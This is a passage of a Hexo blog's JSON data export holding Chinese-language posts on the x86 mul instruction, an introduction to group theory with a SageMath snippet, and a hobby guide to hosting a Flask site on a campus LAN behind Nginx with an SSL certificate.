id=\"mul\"><a href=\"#mul\" class=\"headerlink\" title=\"mul\"></a>mul</h3><p>可以用8位的通用寄存器或者内存单元中的数和寄存器AL中的内容相乘，结果是16位，在AX寄存器中，也可以用16位的通用寄存器或者内存单元中的数和寄存器AX中的内容相乘，结果是32位，高16位和低16位分别在DX和AX中，指令执行后，若结果的高一半全为0，则OF和CF清零，否则置1</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>《x86汇编语言——从实模式到保护模式》——李忠 著</p>"},{"title":"群","date":"2022-03-08T14:23:00.000Z","_content":"\n有人问一个小女孩，3+4 等于几啊？\n小女孩说：“不知道，但我知道 3+4 等于 4+3 .”\n这人只好接着问：“为什么呀？”\n小女孩答道：“因为整数与整数加法构成了阿贝尔群。”\n<!--more-->\n\n## 前言\n\n虽然之前大概也能 get 到笑点，但只觉得阿贝尔群是个高深的概念，也没有细究。后来我接触到密码学，然后就开始学习近世代数，才知道了阿贝尔群就是交换群（即群上的代数运算满足交换律）。\n一开始是在 B 站看的视频，后来发现那个系列是纯数学的，不大适合我，于是转回来看一本叫《近世代数及其应用》的书，正式开始记下笔记。\n\n思来想去，我还是把之前写的一堆定义公式删了，那些个符号我当时不想看，现在也不想写，就试着科普向一点吧，毕竟我写文章也不是为了自娱自乐。\n********************************\n\n## 群的定义\n\n群，一个概念，也并非什么高深的东西，就是一个集合和集合上的运算，注意这个**集合上的**，已经包含了封闭律的意思，所谓封闭律，就是集合上的两个元素的运算结果还在这个集合，比如整数的加法和乘法，而整数的除法就不是了。而在这里的运算已经是一种泛义的说法，包括但不限于加法、乘法、除法、求余等等，甚于我定义出来的运算也是一种运算。在群中的运算一般用$\\circ$或$\\cdot$表示，有时也姑且称之为乘，但注意大多时不是指数的乘法。\n同时，群还满足**结合律**，存在**单位元**和**逆元**。\n\n结合律不必多说，就是括号随便加，而单位元的意思就是，集合中任意元素与这个单位元运算后还是本身，比如任意整数加 0 都不变，那么 0 就是整数加群中的单位元，同理1是有理乘法群中的单位元。\n而逆元同样是针对集合上每个元素，性质就是任意元素与其逆元作运算后都等于单位元，比如整数加群中，1 的逆元是 -1，10086 的逆元是 -10086 ；有理乘法群中，1 的逆元还是 1 ，10086 的逆元是 1/10086 。注意到，对于整数和数的乘法而言，10086 并没有逆元，故整数和数的乘法不作成群。\n\n> 插播一下：混进一个抽代群时有一个进群验证，题目是给出 **A5 的全部正规子群**，而我甚至连 A5 是啥都不知道，but 我有**sagemath**，嘿嘿，直接跑出单位元和 A5 本身，我又试了几下，发现只有 A4 除开单位元和自身外有其他正规子群，非常奇妙。代码如下：\n\n```Python\n#!sage\nx=5\nAx = AlternatingGroup(x)\nfor i in Ax.conjugacy_classes_subgroups():\n    if i.is_normal(Ax):\n        if(i==Ax):\n            print('Ax')\n        else:\n            print(i)\n            for j in i.list():\n                print(j)\n```\n","source":"_posts/群.md","raw":"---\ntitle: 群\ndate: 2022-03-08 22:23:00\ntags: [数学, 抽象代数, Crypto]\ncategories: 数学\n---\n\n有人问一个小女孩，3+4 等于几啊？\n小女孩说：“不知道，但我知道 3+4 等于 4+3 .”\n这人只好接着问：“为什么呀？”\n小女孩答道：“因为整数与整数加法构成了阿贝尔群。”\n<!--more-->\n\n## 前言\n\n虽然之前大概也能 get 到笑点，但只觉得阿贝尔群是个高深的概念，也没有细究。后来我接触到密码学，然后就开始学习近世代数，才知道了阿贝尔群就是交换群（即群上的代数运算满足交换律）。\n一开始是在 B 站看的视频，后来发现那个系列是纯数学的，不大适合我，于是转回来看一本叫《近世代数及其应用》的书，正式开始记下笔记。\n\n思来想去，我还是把之前写的一堆定义公式删了，那些个符号我当时不想看，现在也不想写，就试着科普向一点吧，毕竟我写文章也不是为了自娱自乐。\n********************************\n\n## 群的定义\n\n群，一个概念，也并非什么高深的东西，就是一个集合和集合上的运算，注意这个**集合上的**，已经包含了封闭律的意思，所谓封闭律，就是集合上的两个元素的运算结果还在这个集合，比如整数的加法和乘法，而整数的除法就不是了。而在这里的运算已经是一种泛义的说法，包括但不限于加法、乘法、除法、求余等等，甚于我定义出来的运算也是一种运算。在群中的运算一般用$\\circ$或$\\cdot$表示，有时也姑且称之为乘，但注意大多时不是指数的乘法。\n同时，群还满足**结合律**，存在**单位元**和**逆元**。\n\n结合律不必多说，就是括号随便加，而单位元的意思就是，集合中任意元素与这个单位元运算后还是本身，比如任意整数加 0 都不变，那么 0 就是整数加群中的单位元，同理1是有理乘法群中的单位元。\n而逆元同样是针对集合上每个元素，性质就是任意元素与其逆元作运算后都等于单位元，比如整数加群中，1 的逆元是 -1，10086 的逆元是 -10086 ；有理乘法群中，1 的逆元还是 1 ，10086 的逆元是 1/10086 。注意到，对于整数和数的乘法而言，10086 并没有逆元，故整数和数的乘法不作成群。\n\n> 插播一下：混进一个抽代群时有一个进群验证，题目是给出 **A5 的全部正规子群**，而我甚至连 A5 是啥都不知道，but 我有**sagemath**，嘿嘿，直接跑出单位元和 A5 本身，我又试了几下，发现只有 A4 除开单位元和自身外有其他正规子群，非常奇妙。代码如下：\n\n```Python\n#!sage\nx=5\nAx = AlternatingGroup(x)\nfor i in Ax.conjugacy_classes_subgroups():\n    if i.is_normal(Ax):\n        if(i==Ax):\n            print('Ax')\n        else:\n            print(i)\n            for j in i.list():\n                print(j)\n```\n","slug":"群","published":1,"updated":"2024-06-05T07:52:55.300Z","_id":"cl8wgpppe001ock6g78n6dosb","comments":1,"layout":"post","photos":[],"content":"<p>有人问一个小女孩，3+4 等于几啊？<br>小女孩说：“不知道，但我知道 3+4 等于 4+3 .”<br>这人只好接着问：“为什么呀？”<br>小女孩答道：“因为整数与整数加法构成了阿贝尔群。”</p>\n<span id=\"more\"></span>\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>虽然之前大概也能 get 到笑点，但只觉得阿贝尔群是个高深的概念，也没有细究。后来我接触到密码学，然后就开始学习近世代数，才知道了阿贝尔群就是交换群（即群上的代数运算满足交换律）。<br>一开始是在 B 站看的视频，后来发现那个系列是纯数学的，不大适合我，于是转回来看一本叫《近世代数及其应用》的书，正式开始记下笔记。</p>\n<p>思来想去，我还是把之前写的一堆定义公式删了，那些个符号我当时不想看，现在也不想写，就试着科普向一点吧，毕竟我写文章也不是为了自娱自乐。</p>\n<hr>\n<h2 id=\"群的定义\"><a href=\"#群的定义\" class=\"headerlink\" title=\"群的定义\"></a>群的定义</h2><p>群，一个概念，也并非什么高深的东西，就是一个集合和集合上的运算，注意这个<strong>集合上的</strong>，已经包含了封闭律的意思，所谓封闭律，就是集合上的两个元素的运算结果还在这个集合，比如整数的加法和乘法，而整数的除法就不是了。而在这里的运算已经是一种泛义的说法，包括但不限于加法、乘法、除法、求余等等，甚于我定义出来的运算也是一种运算。在群中的运算一般用$\\circ$或$\\cdot$表示，有时也姑且称之为乘，但注意大多时不是指数的乘法。<br>同时，群还满足<strong>结合律</strong>，存在<strong>单位元</strong>和<strong>逆元</strong>。</p>\n<p>结合律不必多说，就是括号随便加，而单位元的意思就是，集合中任意元素与这个单位元运算后还是本身，比如任意整数加 0 都不变，那么 0 就是整数加群中的单位元，同理1是有理乘法群中的单位元。<br>而逆元同样是针对集合上每个元素，性质就是任意元素与其逆元作运算后都等于单位元，比如整数加群中，1 的逆元是 -1，10086 的逆元是 -10086 ；有理乘法群中，1 的逆元还是 1 ，10086 的逆元是 1/10086 。注意到，对于整数和数的乘法而言，10086 并没有逆元，故整数和数的乘法不作成群。</p>\n<blockquote>\n<p>插播一下：混进一个抽代群时有一个进群验证，题目是给出 <strong>A5 的全部正规子群</strong>，而我甚至连 A5 是啥都不知道，but 我有<strong>sagemath</strong>，嘿嘿，直接跑出单位元和 A5 本身，我又试了几下，发现只有 A4 除开单位元和自身外有其他正规子群，非常奇妙。代码如下：</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!sage</span></span><br><span class=\"line\">x=<span class=\"number\">5</span></span><br><span class=\"line\">Ax = AlternatingGroup(x)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Ax.conjugacy_classes_subgroups():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i.is_normal(Ax):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i==Ax):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Ax&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i.<span class=\"built_in\">list</span>():</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(j)</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>有人问一个小女孩，3+4 等于几啊？<br>小女孩说：“不知道，但我知道 3+4 等于 4+3 .”<br>这人只好接着问：“为什么呀？”<br>小女孩答道：“因为整数与整数加法构成了阿贝尔群。”</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>虽然之前大概也能 get 到笑点，但只觉得阿贝尔群是个高深的概念，也没有细究。后来我接触到密码学，然后就开始学习近世代数，才知道了阿贝尔群就是交换群（即群上的代数运算满足交换律）。<br>一开始是在 B 站看的视频，后来发现那个系列是纯数学的，不大适合我，于是转回来看一本叫《近世代数及其应用》的书，正式开始记下笔记。</p>\n<p>思来想去，我还是把之前写的一堆定义公式删了，那些个符号我当时不想看，现在也不想写，就试着科普向一点吧，毕竟我写文章也不是为了自娱自乐。</p>\n<hr>\n<h2 id=\"群的定义\"><a href=\"#群的定义\" class=\"headerlink\" title=\"群的定义\"></a>群的定义</h2><p>群，一个概念，也并非什么高深的东西，就是一个集合和集合上的运算，注意这个<strong>集合上的</strong>，已经包含了封闭律的意思，所谓封闭律，就是集合上的两个元素的运算结果还在这个集合，比如整数的加法和乘法，而整数的除法就不是了。而在这里的运算已经是一种泛义的说法，包括但不限于加法、乘法、除法、求余等等，甚于我定义出来的运算也是一种运算。在群中的运算一般用$\\circ$或$\\cdot$表示，有时也姑且称之为乘，但注意大多时不是指数的乘法。<br>同时，群还满足<strong>结合律</strong>，存在<strong>单位元</strong>和<strong>逆元</strong>。</p>\n<p>结合律不必多说，就是括号随便加，而单位元的意思就是，集合中任意元素与这个单位元运算后还是本身，比如任意整数加 0 都不变，那么 0 就是整数加群中的单位元，同理1是有理乘法群中的单位元。<br>而逆元同样是针对集合上每个元素，性质就是任意元素与其逆元作运算后都等于单位元，比如整数加群中，1 的逆元是 -1，10086 的逆元是 -10086 ；有理乘法群中，1 的逆元还是 1 ，10086 的逆元是 1/10086 。注意到，对于整数和数的乘法而言，10086 并没有逆元，故整数和数的乘法不作成群。</p>\n<blockquote>\n<p>插播一下：混进一个抽代群时有一个进群验证，题目是给出 <strong>A5 的全部正规子群</strong>，而我甚至连 A5 是啥都不知道，but 我有<strong>sagemath</strong>，嘿嘿，直接跑出单位元和 A5 本身，我又试了几下，发现只有 A4 除开单位元和自身外有其他正规子群，非常奇妙。代码如下：</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!sage</span></span><br><span class=\"line\">x=<span class=\"number\">5</span></span><br><span class=\"line\">Ax = AlternatingGroup(x)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Ax.conjugacy_classes_subgroups():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i.is_normal(Ax):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i==Ax):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Ax&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i.<span class=\"built_in\">list</span>():</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(j)</span><br></pre></td></tr></table></figure>"},{"title":"记一次在局域网搭网站","date":"2022-03-17T02:43:00.000Z","_content":"\n在学校里用自己电脑( Windows10 环境)当服务器搭了个网站，仅可在校园网下访问，图一乐。\n<!--more-->\n\n## 基础\n\n### 安装 flask 框架\n\nFlask 是一个好用且简单的 web 框架，更多操作可以参考 [Flask官网](https://flask.palletsprojects.com/)。\n`pip install flask`\n当然前提得先装好 python ，不提。\n在 VSCode 下可以直接用 Code runner 运行下面代码。\n\n```python\nfrom flask import Flask\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return 'Hello World!'\nif __name__ == '__main__':\n    app.run(\n        host='0.0.0.0', # 加了这个参数局域网内部才可以通过本机ip访问\n        port=5000,  # 端口也可以设成80，访问的时候不用加端口号\n        debug=True, # 开启调试模式，可以实时监控代码更改\n    )\n```\n\n这样，一个基础的网页就搭建好了，在同一个局域网用浏览器访问 `http://<你电脑的内网IP>:5000` 就能看到 `Hello World!` 了。\n但是我在连着无线网的笔记本部署却不能访问，也 ping 不通笔记本的 ip ，其中原因有待细究。\n> 更新：无线网无法访问是因为学校防挖矿病毒，把低端口封了。\n\n## 进阶\n\n### Nginx\n\n有域名的可以下个 Nginx 玩，体验感高很多(bushi)。\nNginx 下载地址 <http://nginx.org/en/download.html>\n建议下载稳定版的，即 `Stable version` 。\n下载后直接解压即可，**不要双击 Nginx.exe**。用终端打开 Nginx 的目录，然后使用命令 `start nginx` 运行。\n以下是一些 Nginx 的常用命令：( Windows 下没有添加环境变量的情况下 nginx 需要换成 `./nginx xxx` )\n\n```cmd\nnginx -s reload # 重载配置文件，更改配置文件后记得重载\nnginx -s reopen # 重启Nginx\nnginx -s stop   # 强行停止Nginx\nnginx -s quit   # 正常退出Nginx\n```\n\n有个小坑就是有时不一定能通过上面的两个命令停止 Nginx ，这时在任务管理器是能看见 Nginx 的进程还在的，需要手动杀掉，否则可能无法正常重载配置文件(即 `config` 文件)。\n同时觉得用命令行太麻烦了，就写了个 Python 的脚本配合 Flask 操作，如下：\n\n```python\nfrom subprocess import Popen, PIPE\nimport psutil\nimport os\nclass Nginx:\n    def __init__(self, path):\n        self.path = path    # Nginx的目录(绝对路径)\n    def start(self):\n        obj = Popen(\"start nginx\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)\n    def quit(self):\n        obj = Popen(\"nginx -s quit\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)  \n        out_info, out_error = obj.communicate()\n        return (out_info, out_error)\n    def reload(self):\n        obj = Popen(\"nginx -s reload\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)  \n        out_info, out_error = obj.communicate()\n        return (out_info, out_error)\n    def restart(self):\n        obj = Popen(\"nginx -s reopen\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)  \n        out_info, out_error = obj.communicate()\n        return (out_info, out_error)\n    def killall(self):\n        pids = psutil.pids()\n        for pid in pids:\n            p = psutil.Process(pid)\n            if p.name() == 'nginx.exe':\n                print(pid)\n                p.kill()\n    def status(self):\n        pids = psutil.pids()\n        nginxpid=[]\n        for pid in pids:\n            p = psutil.Process(pid)\n            if p.name() == 'nginx.exe':\n                nginxpid.append(pid)\n        if len(nginxpid)==0:\n            return('Nginx未运行')\n        else:\n            return('%d 个Nginx进程正在运行中' % len(nginxpid))\n```\n\nnginx.conf 文件(即 Nginx 配置文件，位于 Nginx 的 conf 目录下)的 server 配置如下：\n\n```config\nserver {\n        listen 80;\n        server_name example.com;\n        location / {\n            proxy_pass http://127.0.0.1:5000;\n        }\n    }\n```\n\n`proxy_pass` 后面那个地址必须是本地能访问的，此时我已经将上面python代码中的 `host='0.0.0.0'` 删掉了。\n`server_name` 后面填写域名，记得要先添加 A 记录到局域网 ip ，我为了图方便直接添加了泛域名解析(即 `*.example.com` )。\n\n### SSL 证书\n\n#### 证书申请\n\n由于个人有一丢丢强迫症，看到浏览器 http 的不安全提示总是有点膈应，就想着部署个 SSL 证书解决。然而，其中过程非常麻烦，我最终还是在阿里租的服务器上用宝塔申请了个 Let's Encrypt 证书(免费的，白嫖永不过时)，然后一开始浏览器竟然显示证书是我那个服务器用的域名，折腾了两下换回去又好了，也是莫名其妙的。\n\n> _更新：_\n<https://letsencrypt.osfipin.com/>\n这个网站似乎不错\n\n#### 一些问题\n\nDNS 的验证逻辑非常奇怪，建议添加 TXT 记录后**等待 10 分钟**左右再提交验证申请(我就是栽了几次都验证失败，浪费好多时间)。同时我在 Windows 用 Certbot 申请的时候出现了写入权限的错误，也是莫名其妙的，既然日志文件都能写在目录下，证书却写不了。\n\n#### Nginx 配置\n\n如下：\n\n```config\nserver {\n    listen 80;\n    listen 443 ssl http2;\n    listen [::]:443 ssl http2;\n    server_name example.com;\n    location / {\n        proxy_pass http://127.0.0.1:5000;\n    }\n    # 强制使用 HTTPS，可选\n    # if ($server_port !~ 443) {\n    #     rewrite ^(/.*)$ https://$host$1 permanent;\n    # }\n\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_certificate 证书文件路径;\n    ssl_certificate_key 私钥文件路径;\n\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n\n    ssl_ciphers HIGH:!aNULL:!MD5;\n    ssl_prefer_server_ciphers on;\n}\n```\n","source":"_posts/记一次在局域网搭网站.md","raw":"---\ntitle: 记一次在局域网搭网站\ndate: 2022-03-17 10:43:00\ntags: [Python,Nginx,Windows,SSL]\ncategories: 小玩意\n---\n\n在学校里用自己电脑( Windows10 环境)当服务器搭了个网站，仅可在校园网下访问，图一乐。\n<!--more-->\n\n## 基础\n\n### 安装 flask 框架\n\nFlask 是一个好用且简单的 web 框架，更多操作可以参考 [Flask官网](https://flask.palletsprojects.com/)。\n`pip install flask`\n当然前提得先装好 python ，不提。\n在 VSCode 下可以直接用 Code runner 运行下面代码。\n\n```python\nfrom flask import Flask\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return 'Hello World!'\nif __name__ == '__main__':\n    app.run(\n        host='0.0.0.0', # 加了这个参数局域网内部才可以通过本机ip访问\n        port=5000,  # 端口也可以设成80，访问的时候不用加端口号\n        debug=True, # 开启调试模式，可以实时监控代码更改\n    )\n```\n\n这样，一个基础的网页就搭建好了，在同一个局域网用浏览器访问 `http://<你电脑的内网IP>:5000` 就能看到 `Hello World!` 了。\n但是我在连着无线网的笔记本部署却不能访问，也 ping 不通笔记本的 ip ，其中原因有待细究。\n> 更新：无线网无法访问是因为学校防挖矿病毒，把低端口封了。\n\n## 进阶\n\n### Nginx\n\n有域名的可以下个 Nginx 玩，体验感高很多(bushi)。\nNginx 下载地址 <http://nginx.org/en/download.html>\n建议下载稳定版的，即 `Stable version` 。\n下载后直接解压即可，**不要双击 Nginx.exe**。用终端打开 Nginx 的目录，然后使用命令 `start nginx` 运行。\n以下是一些 Nginx 的常用命令：( Windows 下没有添加环境变量的情况下 nginx 需要换成 `./nginx xxx` )\n\n```cmd\nnginx -s reload # 重载配置文件，更改配置文件后记得重载\nnginx -s reopen # 重启Nginx\nnginx -s stop   # 强行停止Nginx\nnginx -s quit   # 正常退出Nginx\n```\n\n有个小坑就是有时不一定能通过上面的两个命令停止 Nginx ，这时在任务管理器是能看见 Nginx 的进程还在的，需要手动杀掉，否则可能无法正常重载配置文件(即 `config` 文件)。\n同时觉得用命令行太麻烦了，就写了个 Python 的脚本配合 Flask 操作，如下：\n\n```python\nfrom subprocess import Popen, PIPE\nimport psutil\nimport os\nclass Nginx:\n    def __init__(self, path):\n        self.path = path    # Nginx的目录(绝对路径)\n    def start(self):\n        obj = Popen(\"start nginx\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)\n    def quit(self):\n        obj = Popen(\"nginx -s quit\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)  \n        out_info, out_error = obj.communicate()\n        return (out_info, out_error)\n    def reload(self):\n        obj = Popen(\"nginx -s reload\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)  \n        out_info, out_error = obj.communicate()\n        return (out_info, out_error)\n    def restart(self):\n        obj = Popen(\"nginx -s reopen\",cwd=self.path, shell=True, stdout=PIPE, stderr=PIPE)  \n        out_info, out_error = obj.communicate()\n        return (out_info, out_error)\n    def killall(self):\n        pids = psutil.pids()\n        for pid in pids:\n            p = psutil.Process(pid)\n            if p.name() == 'nginx.exe':\n                print(pid)\n                p.kill()\n    def status(self):\n        pids = psutil.pids()\n        nginxpid=[]\n        for pid in pids:\n            p = psutil.Process(pid)\n            if p.name() == 'nginx.exe':\n                nginxpid.append(pid)\n        if len(nginxpid)==0:\n            return('Nginx未运行')\n        else:\n            return('%d 个Nginx进程正在运行中' % len(nginxpid))\n```\n\nnginx.conf 文件(即 Nginx 配置文件，位于 Nginx 的 conf 目录下)的 server 配置如下：\n\n```config\nserver {\n        listen 80;\n        server_name example.com;\n        location / {\n            proxy_pass http://127.0.0.1:5000;\n        }\n    }\n```\n\n`proxy_pass` 后面那个地址必须是本地能访问的，此时我已经将上面python代码中的 `host='0.0.0.0'` 删掉了。\n`server_name` 后面填写域名，记得要先添加 A 记录到局域网 ip ，我为了图方便直接添加了泛域名解析(即 `*.example.com` )。\n\n### SSL 证书\n\n#### 证书申请\n\n由于个人有一丢丢强迫症，看到浏览器 http 的不安全提示总是有点膈应，就想着部署个 SSL 证书解决。然而，其中过程非常麻烦，我最终还是在阿里租的服务器上用宝塔申请了个 Let's Encrypt 证书(免费的，白嫖永不过时)，然后一开始浏览器竟然显示证书是我那个服务器用的域名，折腾了两下换回去又好了，也是莫名其妙的。\n\n> _更新：_\n<https://letsencrypt.osfipin.com/>\n这个网站似乎不错\n\n#### 一些问题\n\nDNS 的验证逻辑非常奇怪，建议添加 TXT 记录后**等待 10 分钟**左右再提交验证申请(我就是栽了几次都验证失败，浪费好多时间)。同时我在 Windows 用 Certbot 申请的时候出现了写入权限的错误，也是莫名其妙的，既然日志文件都能写在目录下，证书却写不了。\n\n#### Nginx 配置\n\n如下：\n\n```config\nserver {\n    listen 80;\n    listen 443 ssl http2;\n    listen [::]:443 ssl http2;\n    server_name example.com;\n    location / {\n        proxy_pass http://127.0.0.1:5000;\n    }\n    # 强制使用 HTTPS，可选\n    # if ($server_port !~ 443) {\n    #     rewrite ^(/.*)$ https://$host$1 permanent;\n    # }\n\n    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;\n    ssl_certificate 证书文件路径;\n    ssl_certificate_key 私钥文件路径;\n\n    ssl_session_cache shared:SSL:1m;\n    ssl_session_timeout 5m;\n\n    ssl_ciphers HIGH:!aNULL:!MD5;\n    ssl_prefer_server_ciphers on;\n}\n```\n","slug":"记一次在局域网搭网站","published":1,"updated":"2024-06-11T07:51:18.488Z","_id":"cl8wgpppf001qck6g39nr082p","comments":1,"layout":"post","photos":[],"content":"<p>在学校里用自己电脑( Windows10 环境)当服务器搭了个网站，仅可在校园网下访问，图一乐。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h2><h3 id=\"安装-flask-框架\"><a href=\"#安装-flask-框架\" class=\"headerlink\" title=\"安装 flask 框架\"></a>安装 flask 框架</h3><p>Flask 是一个好用且简单的 web 框架，更多操作可以参考 <a href=\"https://flask.palletsprojects.com/\">Flask官网</a>。<br><code>pip install flask</code><br>当然前提得先装好 python ，不提。<br>在 VSCode 下可以直接用 Code runner 运行下面代码。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Hello World!&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(</span><br><span class=\"line\">        host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"comment\"># 加了这个参数局域网内部才可以通过本机ip访问</span></span><br><span class=\"line\">        port=<span class=\"number\">5000</span>,  <span class=\"comment\"># 端口也可以设成80，访问的时候不用加端口号</span></span><br><span class=\"line\">        debug=<span class=\"literal\">True</span>, <span class=\"comment\"># 开启调试模式，可以实时监控代码更改</span></span><br><span class=\"line\">    )</span><br></pre></td></tr></table></figure>\n\n<p>这样，一个基础的网页就搭建好了，在同一个局域网用浏览器访问 <code>http://&lt;你电脑的内网IP&gt;:5000</code> 就能看到 <code>Hello World!</code> 了。<br>但是我在连着无线网的笔记本部署却不能访问，也 ping 不通笔记本的 ip ，其中原因有待细究。</p>\n<blockquote>\n<p>更新：无线网无法访问是因为学校防挖矿病毒，把低端口封了。</p>\n</blockquote>\n<h2 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h2><h3 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h3><p>有域名的可以下个 Nginx 玩，体验感高很多(bushi)。<br>Nginx 下载地址 <a href=\"http://nginx.org/en/download.html\">http://nginx.org/en/download.html</a><br>建议下载稳定版的，即 <code>Stable version</code> 。<br>下载后直接解压即可，<strong>不要双击 Nginx.exe</strong>。用终端打开 Nginx 的目录，然后使用命令 <code>start nginx</code> 运行。<br>以下是一些 Nginx 的常用命令：( Windows 下没有添加环境变量的情况下 nginx 需要换成 <code>./nginx xxx</code> )</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload # 重载配置文件，更改配置文件后记得重载</span><br><span class=\"line\">nginx -s reopen # 重启Nginx</span><br><span class=\"line\">nginx -s stop   # 强行停止Nginx</span><br><span class=\"line\">nginx -s quit   # 正常退出Nginx</span><br></pre></td></tr></table></figure>\n\n<p>有个小坑就是有时不一定能通过上面的两个命令停止 Nginx ，这时在任务管理器是能看见 Nginx 的进程还在的，需要手动杀掉，否则可能无法正常重载配置文件(即 <code>config</code> 文件)。<br>同时觉得用命令行太麻烦了，就写了个 Python 的脚本配合 Flask 操作，如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> Popen, PIPE</span><br><span class=\"line\"><span class=\"keyword\">import</span> psutil</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Nginx</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, path</span>):</span><br><span class=\"line\">        self.path = path    <span class=\"comment\"># Nginx的目录(绝对路径)</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">start</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;start nginx&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title 